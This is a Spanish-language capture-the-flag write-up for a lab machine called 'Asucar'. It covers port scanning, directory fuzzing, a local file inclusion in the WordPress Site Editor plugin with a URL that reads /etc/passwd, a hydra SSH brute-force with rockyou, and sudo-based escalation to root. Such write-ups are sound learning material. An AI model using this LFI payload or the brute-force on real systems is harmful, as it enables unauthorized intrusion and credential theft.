# Máquina Asucar

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

### Fuzzing Web

gobuster dir -t 200 -u http://172.17.0.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

![alt text](image-2.png)

Utilicé wpscan para tratar de buscar usuarios, pero no encontré nada.

### Entrando en la web

Al entrar en la web me di cuenta de que hay un dominio asucar.dl, entonces lo agregué al /etc/hosts

### Intrusión

Lo que hice fue hacer un curl, para ver si tiene algún plugin vulnerable.

curl -s -X GET "http://172.17.0.2/" | grep plugins 

![alt text](image-3.png)

entonces como llama a site editor, lo busqué por searchsploit

![alt text](image-4.png)

me dice que el plugin trata de un LFI.

tengo que entrar a esta ruta para ver el /etc/passwd

http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

![alt text](image-5.png)

Ahora como ya tengo un usuario y también tengo el servicio ssh corriendo, entonces lo que hice fue un ataque de fuerza bruta:

hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -I

![alt text](image-6.png)

Inicié sesión mediante ssh con las credenciales:

ssh curiosito@172.17.0.2

![alt text](image-7.png)

### Escalar privilegios

hice sudo -l

![alt text](image-8.png)

ejecuté los siguientes comandos:

![alt text](image-9.png)

luego descargué el id_rsa de curiosito y me conecté como root por ssh.

![alt text](image-10.png)